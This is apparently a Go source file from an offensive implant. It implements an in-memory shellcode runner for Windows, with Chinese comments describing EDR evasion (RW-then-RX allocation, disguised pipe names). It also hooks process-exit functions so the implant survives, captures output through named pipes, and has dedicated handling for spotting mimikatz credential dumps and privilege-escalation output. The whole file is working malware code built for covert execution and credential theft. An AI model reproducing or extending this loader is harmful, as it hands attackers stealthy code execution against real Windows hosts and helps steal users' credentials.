//go:build windows
// +build windows

package commands

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"implant/core/communication"
	"log"
	"syscall"
	"time"
	"unsafe"

	"github.com/google/uuid"
	"golang.org/x/sys/windows"
)

type PROCESS_BASIC_INFORMATION struct {
	Reserved1    uintptr
	PebAddress   uintptr
	Reserved2    uintptr
	Reserved3    uintptr
	UniquePid    uintptr
	MoreReserved uintptr
}

const (
	PAGE_EXECUTE_READWRITE = 0x40
	PAGE_EXECUTE_READ      = 0x20 // RX 执行（写入后切换）
	// PAGE_READWRITE(0x04) 与 bof_windows.go 中定义一致，包级常量不可重名，直接复用
	PROCESS_ALL_ACCESS    = 0x001F0FFF
	MEM_COMMIT            = 0x1000
	MEM_RESERVE           = 0x2000
	GENERIC_WRITE         = 0x40000000
	FILE_SHARE_WRITE      = 0x00000002
	CREATE_ALWAYS         = 2
	FILE_ATTRIBUTE_NORMAL = 0x80
	STD_OUTPUT_HANDLE     = -11
	MEM_RELEASE           = 0x8000
)

var (
	ntdll = windows.NewLazySystemDLL("ntdll.dll")
	// kernel32 already declared in commands_windows.go

	virtualProtect      = kernel32.NewProc("VirtualProtect")
	writeProcessMemory  = kernel32.NewProc("WriteProcessMemory")
	readProcessMemory   = kernel32.NewProc("ReadProcessMemory")
	openProcess         = kernel32.NewProc("OpenProcess")
	virtualAllocEx      = kernel32.NewProc("VirtualAllocEx")
	createRemoteThread  = kernel32.NewProc("CreateRemoteThread")
	getModuleHandleA    = kernel32.NewProc("GetModuleHandleA")
	getProcAddressProc  = kernel32.NewProc("GetProcAddress")
	procVirtualAlloc    = kernel32.NewProc("VirtualAlloc")
	kernelVirtualFree   = kernel32.NewProc("VirtualFree")
	procVirtualProtect  = kernel32.NewProc("VirtualProtect")
	procCreateNamedPipe = kernel32.NewProc("CreateNamedPipeW")
	procReadFile        = kernel32.NewProc("ReadFile")
	procSetStdHandle    = kernel32.NewProc("SetStdHandle")
)

func getModuleHandleW(moduleName string) (uintptr, error) {
	moduleNameBytes := append([]byte(moduleName), 0)
	handle, _, err := getModuleHandleA.Call(uintptr(unsafe.Pointer(&moduleNameBytes[0])))
	if handle == 0 {
		return 0, fmt.Errorf("GetModuleHandle failed: %v", err)
	}
	return handle, nil
}

func getProcAddressW(moduleHandle uintptr, procName string) (uintptr, error) {
	procNameBytes := append([]byte(procName), 0)
	addr, _, err := getProcAddressProc.Call(moduleHandle, uintptr(unsafe.Pointer(&procNameBytes[0])))
	if addr == 0 {
		return 0, fmt.Errorf("GetProcAddress failed: %v", err)
	}
	return addr, nil
}

// patchExit 在执行 shellcode 前临时劫持 TerminateProcess/NtTerminateProcess/RtlExitUserProcess，
// 防止 shellcode 调 ExitProcess 时整个植入退出。返回各函数地址 -> 原始字节，供 restoreExitPatches 恢复。
func patchExit(processHandle uintptr, debug bool) map[uintptr][]byte {
	patches := make(map[uintptr][]byte)

	// 获取ExitThread函数地址
	kernelbaseHandle, err := getModuleHandleW("kernelbase.dll")
	if err != nil {
		debugLog(debug, "[!] failed to get kernelbase handle: %v", err)
		return patches
	}
	exitThreadAddr, err := getProcAddressW(kernelbaseHandle, "ExitThread")
	if err != nil {
		debugLog(debug, "[!] failed to get ExitThread address: %v", err)
		return patches
	}

	// 构造patch代码
	patchBytes := []byte{
		0x48, 0xC7, 0xC1, 0x00, 0x00, 0x00, 0x00, // mov rcx, 0
		0x48, 0xB8, // mov rax,
	}
	// 添加ExitThread地址
	addrBytes := make([]byte, 8)
	binary.LittleEndian.PutUint64(addrBytes, uint64(exitThreadAddr))
	patchBytes = append(patchBytes, addrBytes...)
	patchBytes = append(patchBytes, 0x50) // push rax
	patchBytes = append(patchBytes, 0xC3) // ret

	functionsToPath := []struct {
		module   string
		function string
	}{
		{"kernelbase.dll", "TerminateProcess"},
		{"ntdll.dll", "NtTerminateProcess"},
		{"ntdll.dll", "RtlExitUserProcess"},
	}

	// 对每个函数进行patch
	for _, f := range functionsToPath {
		moduleHandle, err := getModuleHandleW(f.module)
		if err != nil {
			debugLog(debug, "[!] Failed to get module handle for %s: %v", f.module, err)
			continue
		}

		funcAddr, err := getProcAddressW(moduleHandle, f.function)
		if err != nil {
			debugLog(debug, "[!] Failed to get proc address for %s: %v", f.function, err)
			continue
		}

		// 保存原始字节
		originalBytes := make([]byte, len(patchBytes))
		ret, _, err := readProcessMemory.Call(
			processHandle,
			funcAddr,
			uintptr(unsafe.Pointer(&originalBytes[0])),
			uintptr(len(originalBytes)),
			0,
		)
		if ret == 0 {
			debugLog(debug, "[!] Failed to read original bytes from %s: %v", f.function, err)
			continue
		}

		// 修改内存保护
		var oldProtect uint32
		ret, _, err = virtualProtect.Call(
			funcAddr,
			uintptr(len(patchBytes)),
			PAGE_EXECUTE_READWRITE,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if ret == 0 {
			debugLog(debug, "[!] Failed to change memory protection for %s: %v", f.function, err)
			continue
		}

		// 写入patch代码
		ret, _, err = writeProcessMemory.Call(
			processHandle,
			funcAddr,
			uintptr(unsafe.Pointer(&patchBytes[0])),
			uintptr(len(patchBytes)),
			0,
		)
		if ret == 0 {
			debugLog(debug, "[!] Failed to write patch bytes to %s: %v", f.function, err)
			continue
		}

		// 恢复内存保护
		ret, _, err = virtualProtect.Call(
			funcAddr,
			uintptr(len(patchBytes)),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if ret == 0 {
			debugLog(debug, "[!] Warning: Failed to restore memory protection for %s: %v", f.function, err)
		}

		patches[funcAddr] = originalBytes
		debugLog(debug, "[+] Successfully patched %s!%s", f.module, f.function)
	}

	return patches
}

// restoreExitPatches 恢复 patchExit 劫持的函数原始字节，避免对后续进程行为（TerminateProcess 等）造成永久影响。
func restoreExitPatches(processHandle uintptr, patches map[uintptr][]byte) {
	for funcAddr, originalBytes := range patches {
		var oldProtect uint32
		ret, _, err := virtualProtect.Call(
			processHandle,
			funcAddr,
			uintptr(len(originalBytes)),
			PAGE_EXECUTE_READWRITE,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
		if ret == 0 {
			log.Printf("[!] restoreExitPatches: VirtualProtect failed for %v: %v", funcAddr, err)
			continue
		}
		ret, _, err = writeProcessMemory.Call(
			processHandle,
			funcAddr,
			uintptr(unsafe.Pointer(&originalBytes[0])),
			uintptr(len(originalBytes)),
			0,
		)
		if ret == 0 {
			log.Printf("[!] restoreExitPatches: WriteProcessMemory failed for %v: %v", funcAddr, err)
		}
		virtualProtect.Call(
			processHandle,
			funcAddr,
			uintptr(len(originalBytes)),
			uintptr(oldProtect),
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}
	debugLog(true, "[+] Exit function patches restored")
}

func debugLog(debug bool, format string, v ...interface{}) {
	if debug {
		log.Printf(format, v...)
	}
}

// SetStdHandle changes the standard output handle.
func SetStdHandle(nStdHandle int, hHandle windows.Handle) error {
	ret, _, err := syscall.Syscall(procSetStdHandle.Addr(), 2,
		uintptr(nStdHandle), uintptr(hHandle), 0)
	if ret == 0 {
		return fmt.Errorf("SetStdHandle failed: %v", err)
	}
	return nil
}

// CreateNamedPipe creates a named pipe on Windows.
func CreateNamedPipe(pipeName string) (windows.Handle, error) {
	pipeNamePtr, err := windows.UTF16PtrFromString(pipeName)
	if err != nil {
		return 0, err
	}

	handle, err := windows.CreateNamedPipe(
		pipeNamePtr,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
		1, 65535, 65535, 0, nil)
	if err != nil {
		return 0, fmt.Errorf("Failed to create named pipe: %v", err)
	}
	return handle, nil
}

// ReadPipe reads data from the pipe.
func ReadPipe(pipe windows.Handle) ([]byte, error) {
	var bytesRead uint32
	buffer := make([]byte, 65535)
	ret, _, err := syscall.Syscall6(
		procReadFile.Addr(), 5,
		uintptr(pipe),
		uintptr(unsafe.Pointer(&buffer[0])),
		uintptr(len(buffer)),
		uintptr(unsafe.Pointer(&bytesRead)),
		0, 0)
	if ret == 0 {
		return nil, fmt.Errorf("Failed to read pipe: %v", err)
	}
	return buffer[:bytesRead], nil
}

// VirtualAlloc allocates memory for shellcode execution
// 【隐蔽性】以 PAGE_READWRITE(RW) 申请，避免 RWX 区域（EDR/AV 重点监控）：
// 写入载荷后再 VirtualProtect 转 PAGE_EXECUTE_READ(RX) 执行。
func VirtualAlloc(size int) (uintptr, error) {
	// 验证参数有效性
	if size <= 0 {
		return 0, fmt.Errorf("Invalid size parameter: %d. Size must be greater than 0", size)
	}

	// 确保大小是页面大小的倍数（4KB对齐）
	pageSize := 4096
	alignedSize := ((size + pageSize - 1) / pageSize) * pageSize

	communication.ExecOutput([]byte(fmt.Sprintf("[*] Allocating %d bytes (%d aligned) for execution", size, alignedSize)))

	ret, _, err := syscall.Syscall6(
		procVirtualAlloc.Addr(), 4,
		0,                    // NULL for no specific memory address
		uintptr(alignedSize), // The aligned size of the memory to allocate
		MEM_COMMIT|MEM_RESERVE,
		PAGE_READWRITE, // RW 申请（原 RWX → EDR 高危告警特征）
		0, 0)

	if ret == 0 {
		// 获取详细的错误信息
		lastError := windows.GetLastError()
		errorMsg := fmt.Sprintf("VirtualAlloc failed: size=%d, alignedSize=%d, error=%v, lastError=%d",
			size, alignedSize, err, lastError)
		communication.ExecOutput([]byte(fmt.Sprintf("[!] %s", errorMsg)))
		return 0, fmt.Errorf("%s", errorMsg)
	}

	communication.ExecOutput([]byte(fmt.Sprintf("[+] Memory allocated successfully at 0x%x", ret)))
	return ret, nil
}

func generateRandomPipeName() string {
	// 使用 UUID 生成唯一的管道名
	return fmt.Sprintf(`\\.\\pipe\\%s_%s`, masquerade("Pipe"), uuid.New().String())
}

// VirtualProtect changes the memory protection of a block of memory
func VirtualProtect(ptr uintptr, size int, protect uint32) error {
	var oldProtect uint32
	ret, _, err := syscall.Syscall6(
		procVirtualProtect.Addr(), 4,
		ptr,
		uintptr(size),
		uintptr(protect),
		uintptr(unsafe.Pointer(&oldProtect)),
		0, 0)
	if ret == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	return nil
}

func InlineBin(buf []byte) ([]byte, error) {
	communication.ExecOutput([]byte("[*] Starting InlineBin execution..."))

	// 验证输入数据
	if len(buf) == 0 {
		errorMsg := "[!] Error: No data provided for execution"
		communication.ExecOutput([]byte(errorMsg))
		return []byte(errorMsg), fmt.Errorf("no data provided")
	}

	// 检查是否是可执行文件而非shellcode
	if len(buf) >= 2 && buf[0] == 0x4D && buf[1] == 0x5A {
		errorMsg := "[!] Error: Detected PE executable file (MZ header).\n" +
			"[*] InlineBin mode is designed for shellcode, not raw executables.\n\n" +
			"[*] For fscan.exe and similar tools, please use one of these alternatives:\n" +
			"  1. File Upload: Upload the file and execute it traditionally\n" +
			"  2. PE2Shellcode: Convert PE to shellcode using tools like:\n" +
			"     - Donut: https://github.com/TheWover/donut\n" +
			"     - pe_to_shellcode: Converts PE to position-independent shellcode\n" +
			"     - sRDI: Shellcode Reflective DLL Injection\n" +
			"  3. Execute Assembly: For .NET executables\n\n" +
			"[*] InlineBin works best with:\n" +
			"  - Raw shellcode (.bin files)\n" +
			"  - Position-independent code\n" +
			"  - Meterpreter payloads\n" +
			"  - Tools already converted to shellcode format\n\n" +
			"[*] Note: mimikatz works because it's often distributed as shellcode,\n" +
			"         while fscan.exe is a standard PE that requires proper loading."
		communication.ExecOutput([]byte(errorMsg))
		return []byte(errorMsg), nil
	}

	communication.ExecOutput([]byte(fmt.Sprintf("[*] Data size: %d bytes", len(buf))))
	communication.ExecOutput([]byte("[*] Detected shellcode format - proceeding with injection"))
	handle, _ := windows.GetCurrentProcess()
	// 临时劫持退出函数防止 shellcode 退出植入进程；执行结束后恢复，避免永久影响后续进程行为
	patches := patchExit(uintptr(handle), true)
	defer restoreExitPatches(uintptr(handle), patches)

	// 创建多个管道以应对权限变化
	pipeResults := make(chan []byte, 10)
	pipeErrors := make(chan error, 5)
	done := make(chan bool, 1)

	// 创建主要命名管道
	pipeName := generateRandomPipeName()
	pipeNamePtr, err := windows.UTF16PtrFromString(pipeName)
	if err != nil {
		log.Printf("[!] Failed to convert pipe name to UTF-16 pointer: %v", err)
		return nil, err
	}

	pipeHandle, err := windows.CreateNamedPipe(
		pipeNamePtr,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
		1, 65536, 65536, 0, nil)
	if err != nil {
		log.Printf("[!] 创建命名管道失败: %v", err)
		return nil, err
	}
	defer windows.Close(pipeHandle)

	// 创建备用全局命名管道（可跨会话访问）
	globalPipeName := fmt.Sprintf(`\\.\pipe\Global\\%s_%s`, masquerade("Global"), uuid.New().String())
	globalPipeNamePtr, _ := windows.UTF16PtrFromString(globalPipeName)

	globalPipeHandle, globalErr := windows.CreateNamedPipe(
		globalPipeNamePtr,
		windows.PIPE_ACCESS_DUPLEX,
		windows.PIPE_TYPE_BYTE|windows.PIPE_READMODE_BYTE|windows.PIPE_WAIT,
		1, 65536, 65536, 0, nil)
	if globalErr == nil {
		defer windows.Close(globalPipeHandle)
	}

	// Open the main pipe（【阶段三-4】设置 bInheritHandle：
	// 使 shellcode 派生的子进程可继承 stdout 管道，子进程输出不再丢失）
	sa := &windows.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		InheritHandle: 1,
	}
	pipeHandle2, err := windows.CreateFile(
		pipeNamePtr,
		windows.GENERIC_READ|windows.GENERIC_WRITE,
		windows.FILE_SHARE_READ|windows.FILE_SHARE_WRITE,
		sa,
		windows.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		log.Printf("[!] Failed to open named pipe: %v", err)
		return nil, err
	}
	defer windows.Close(pipeHandle2)

	// 保存原始 stdout 句柄，执行结束后恢复（避免污染进程级标准句柄导致后续子进程/ConPTY 异常）
	origStdout, _ := windows.GetStdHandle(windows.STD_OUTPUT_HANDLE)
	// Set the output handle to the pipe
	SetStdHandle(STD_OUTPUT_HANDLE, pipeHandle2)
	defer func() {
		if origStdout != 0 && origStdout != windows.InvalidHandle {
			SetStdHandle(STD_OUTPUT_HANDLE, origStdout)
		}
	}()

	// 启动多个输出读取goroutine以提高容错性
	go func() {
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[PANIC] Pipe reading goroutine panic: %v", r)
			}
		}()

		// 设置读取超时以防止无限阻塞
		readTimeout := time.After(45 * time.Second)
		ticker := time.NewTicker(100 * time.Millisecond)
		defer ticker.Stop()

		for {
			select {
			case <-done:
				log.Printf("[INFO] Pipe reading goroutine terminated")
				return
			case <-readTimeout:
				log.Printf("[WARNING] Pipe reading timeout")
				communication.ExecOutput([]byte("[*] Pipe reading timeout - stopping output capture"))
				return
			case <-ticker.C:
				output, err := ReadPipe(pipeHandle)
				if err != nil {
					pipeErrors <- err
					continue
				}
				if len(output) > 0 {
					pipeResults <- output
					communication.ExecOutput(output)
				}
			}
		}
	}()

	// 如果有全局管道，也启动读取（带超时保护）
	if globalErr == nil {
		go func() {
			defer func() {
				if r := recover(); r != nil {
					log.Printf("[PANIC] Global pipe reading goroutine panic: %v", r)
				}
			}()

			globalTimeout := time.After(45 * time.Second)
			ticker := time.NewTicker(100 * time.Millisecond)
			defer ticker.Stop()

			for {
				select {
				case <-done:
					log.Printf("[INFO] Global pipe reading goroutine terminated")
					return
				case <-globalTimeout:
					log.Printf("[WARNING] Global pipe reading timeout")
					return
				case <-ticker.C:
					output, err := ReadPipe(globalPipeHandle)
					if err != nil {
						continue
					}
					if len(output) > 0 {
						pipeResults <- output
						communication.ExecOutput(output)
					}
				}
			}
		}()
	}

	// Allocate memory for shellcode (ensure enough size)
	ptr, err := VirtualAlloc(len(buf))
	if err != nil {
		log.Printf("[!] VirtualAlloc failed: %v", err)
		return nil, err
	}

	// Cast the allocated memory as a slice with enough length to hold buf
	shellcodeMemory := unsafe.Slice((*byte)(unsafe.Pointer(ptr)), len(buf))

	// Copy shellcode into allocated memory（内存当前为 RW，无需再切 RWX）
	copy(shellcodeMemory, buf)
	// 【隐蔽性】写入完成后切换为 PAGE_EXECUTE_READ(RX) 再执行——全程无 RWX 区域
	err = VirtualProtect(ptr, len(buf), PAGE_EXECUTE_READ)
	if err != nil {
		log.Printf("[!] VirtualProtect failed: %v", err)
		return nil, err
	}

	// 记录执行开始时间
	startTime := time.Now()
	communication.ExecOutput([]byte(fmt.Sprintf("[*] Starting shellcode execution at %s", startTime.Format("15:04:05"))))

	// Execute shellcode using syscall.Syscall to avoid Go runtime interference
	go func() {
		defer func() {
			if r := recover(); r != nil {
				errorMsg := fmt.Sprintf("[!] Shellcode execution panic: %v", r)
				communication.ExecOutput([]byte(errorMsg))
				log.Printf("%s", errorMsg)
			}
			// 确保在执行完成后停止所有线程
			select {
			case done <- true:
			default:
			}
		}()

		// 使用超时机制防止无限阻塞
		executionDone := make(chan error, 1)
		go func() {
			_, _, callErr := syscall.Syscall(ptr, 0, 0, 0, 0)
			if callErr != 0 {
				executionDone <- fmt.Errorf("Shellcode execution failed: %v", callErr)
			} else {
				executionDone <- nil
			}
		}()

		// 等待执行完成或超时
		select {
		case err := <-executionDone:
			if err != nil {
				errorMsg := fmt.Sprintf("[!] %v", err)
				communication.ExecOutput([]byte(errorMsg))
				log.Printf("%s", errorMsg)
			} else {
				communication.ExecOutput([]byte("[+] Shellcode execution completed"))
			}
			// 【修复】执行完成后释放 RWX 内存，防止每次执行泄漏一个可执行区域
			if ptr != 0 {
				kernelVirtualFree.Call(ptr, 0, MEM_RELEASE)
				log.Printf("[INFO] Shellcode memory freed: 0x%x", ptr)
			}
		case <-time.After(30 * time.Second):
			communication.ExecOutput([]byte("[*] Shellcode execution timeout - may be running in background"))
			log.Printf("[WARNING] Shellcode execution timeout")
			// 超时路径不释放内存：shellcode 可能仍在运行，释放会导致崩溃
		}
	}()

	// 增强的等待和监控逻辑 - 专门针对 mimikatz 等工具优化
	timeout := time.After(45 * time.Second)      // 增加超时时间到45秒
	heartbeat := time.NewTicker(1 * time.Second) // 减少心跳间隔提高响应性
	defer heartbeat.Stop()

	var allOutput []byte
	outputReceived := false
	errorCount := 0
	lastOutputTime := time.Now()

	// 检测是否是 mimikatz 或类似工具
	isMimikatz := bytes.Contains(buf, []byte("mimikatz")) ||
		bytes.Contains(buf, []byte("sekurlsa")) ||
		bytes.Contains(buf, []byte("privilege::debug"))

	if isMimikatz {
		communication.ExecOutput([]byte("[*] Detected mimikatz-like tool - extending timeout and improving output capture"))
	}

	for {
		select {
		case output := <-pipeResults:
			allOutput = append(allOutput, output...)
			outputReceived = true
			lastOutputTime = time.Now()

			// 检查是否包含提权成功的标识
			if bytes.Contains(output, []byte("nt authority\\system")) ||
				bytes.Contains(output, []byte("SYSTEM")) ||
				bytes.Contains(output, []byte("SeImpersonatePrivilege")) {
				communication.ExecOutput([]byte("[+] Privilege escalation detected!"))
			}

			// 检测 mimikatz 特有输出
			if bytes.Contains(output, []byte("Authentication Id")) ||
				bytes.Contains(output, []byte("Session")) ||
				bytes.Contains(output, []byte("Username")) ||
				bytes.Contains(output, []byte("Domain")) {
				communication.ExecOutput([]byte("[+] Mimikatz credential output detected!"))
			}

		case err := <-pipeErrors:
			errorCount++
			log.Printf("[!] Pipe error %d: %v", errorCount, err)
			if errorCount > 15 { // 增加错误容忍度
				communication.ExecOutput([]byte("[!] Too many pipe errors, execution may have completed"))
				goto cleanup
			}

		case <-heartbeat.C:
			elapsedTime := time.Since(startTime)
			timeSinceLastOutput := time.Since(lastOutputTime)

			// 更详细的状态报告
			if outputReceived {
				heartbeatMsg := fmt.Sprintf("[*] Execution running for %v seconds, %d bytes captured, last output %v ago",
					int(elapsedTime.Seconds()), len(allOutput), int(timeSinceLastOutput.Seconds()))
				communication.ExecOutput([]byte(heartbeatMsg))
			} else {
				heartbeatMsg := fmt.Sprintf("[*] Execution running for %v seconds, waiting for output...", int(elapsedTime.Seconds()))
				communication.ExecOutput([]byte(heartbeatMsg))
			}

			// 如果是 mimikatz 且长时间没有输出，给出特殊提示
			if isMimikatz && elapsedTime > 10*time.Second && !outputReceived {
				communication.ExecOutput([]byte("[*] Mimikatz detected - output may appear after privilege acquisition"))
				communication.ExecOutput([]byte("[*] Please wait, some security tools take time to initialize..."))
			}

			// 如果有输出但最近没有新输出，可能是执行完成
			if outputReceived && timeSinceLastOutput > 8*time.Second && len(allOutput) > 100 {
				communication.ExecOutput([]byte("[*] No new output for 8 seconds, execution may be complete"))
				goto cleanup
			}

		case <-timeout:
			communication.ExecOutput([]byte("[*] Execution timeout reached (45 seconds)"))
			if len(allOutput) > 0 {
				communication.ExecOutput([]byte(fmt.Sprintf("[+] Captured %d bytes of output before timeout", len(allOutput))))
				// 直接输出捕获的内容以确保用户能看到
				communication.ExecOutput([]byte("\n=== CAPTURED OUTPUT ===\n"))
				communication.ExecOutput(allOutput)
				communication.ExecOutput([]byte("\n=== END OUTPUT ===\n"))
			} else {
				communication.ExecOutput([]byte("[!] No output captured - execution may have succeeded with privilege changes"))
				communication.ExecOutput([]byte("[*] Check system manually for execution results"))
			}
			goto cleanup
		}
	}

cleanup:
	// 确保所有goroutine都停止
	select {
	case done <- true:
	default:
	}

	// 强制结束所有相关的goroutine，防止无限循环
	communication.ExecOutput([]byte("[*] Terminating all shellcode-related processes..."))

	// 等待短时间让goroutine正常退出
	time.Sleep(500 * time.Millisecond)

	executionSummary := fmt.Sprintf("[*] InlineBin execution completed after %v seconds",
		int(time.Since(startTime).Seconds()))
	communication.ExecOutput([]byte(executionSummary))

	if len(allOutput) > 0 {
		// 输出最终结果的详细信息
		finalMsg := fmt.Sprintf("[+] Execution completed successfully. Output length: %d bytes", len(allOutput))
		communication.ExecOutput([]byte(finalMsg))

		// 确保输出内容被发送 - 关键修复
		communication.ExecOutput([]byte("\n=== FINAL OUTPUT DUMP ===\n"))
		communication.ExecOutput(allOutput)
		communication.ExecOutput([]byte("\n=== END FINAL OUTPUT ===\n"))

		// 输出已通过上面的 FINAL OUTPUT DUMP 发过；这里只返回简短摘要，
		// 避免 dispatch 再发一遍造成插件页重复输出。
		return []byte(fmt.Sprintf("[+] InlineBin completed: %d bytes captured", len(allOutput))), nil
	}

	return []byte("[*] Execution completed - no output captured (may indicate privilege changes or console output)"), nil
}
